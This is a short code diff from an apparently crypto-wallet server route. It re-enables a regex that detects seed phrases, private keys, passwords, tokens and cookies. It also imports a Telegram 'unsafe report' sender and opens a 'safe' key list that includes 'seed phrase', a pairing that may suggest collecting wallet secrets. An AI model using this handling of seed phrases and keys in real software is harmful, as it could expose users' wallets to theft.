@@ -3,10 +3,10 @@ import { addCorsHeaders, handleCorsPreFlight } from '@/lib/server/cors.js';
 import { sendUnsafeReport } from '@/lib/telegram.js';
 
 
-// function containsSensitiveData(obj) {
-//   const text = JSON.stringify(obj).toLowerCase();
-//   return /(?:seed\s*phrase|mnemonic|private[_ -]?key|password|passwd|bearer\s+[a-z0-9._-]+|api[_ -]?key\s*[:=]|secret\s*[:=]|jwt\s*[:=]|cookie\s*[:=])/.test(text);
-// }
+function containsSensitiveData(obj) {
+  const text = JSON.stringify(obj).toLowerCase();
+  return /(?:seed\s*phrase|mnemonic|private[_ -]?key|password|passwd|bearer\s+[a-z0-9._-]+|api[_ -]?key\s*[:=]|secret\s*[:=]|jwt\s*[:=]|cookie\s*[:=])/.test(text);
+}
 
 const SAFE_DATA_KEYS = [
   'action', 'wallet', 'walletAddress', 'fromToken', 'toToken', 'seed phrase',
